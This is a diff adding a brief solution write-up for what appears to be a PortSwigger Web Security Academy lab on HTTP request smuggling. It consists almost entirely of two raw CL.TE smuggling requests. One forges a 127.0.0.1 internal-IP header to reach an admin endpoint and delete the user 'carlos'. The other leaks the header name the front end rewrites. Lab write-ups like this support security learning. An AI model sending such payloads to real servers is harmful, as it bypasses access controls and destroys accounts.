@@ -1,0 +1,45 @@
+using the following, I was able to solve the lab:
+"
+POST / HTTP/1.1
+Host: 0a44004a04f5fe0681a616d200c2006f.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: https://portswigger.net/
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 166
+Transfer-Encoding: chunked
+Cookie: session=dk79ZFtS1ZsLfcSD4c9y8KDDoHzjzJ0I
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+X-Yimxsy-Ip: 127.0.0.1
+Content-Length: 10
+connection: close
+
+x=1
+"
+
+How I got the X-Yimxsy-Ip HTTP header was from the request:
+"
+POST / HTTP/1.1
+Host: 0a44004a04f5fe0681a616d200c2006f.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: https://portswigger.net/
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 167
+Transfer-Encoding: chunked
+Cookie: session=dk79ZFtS1ZsLfcSD4c9y8KDDoHzjzJ0I
+
+0
+
+POST / HTTP/1.1
+Host: 0a44004a04f5fe0681a616d200c2006f.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 798
+
+search=
+"
+
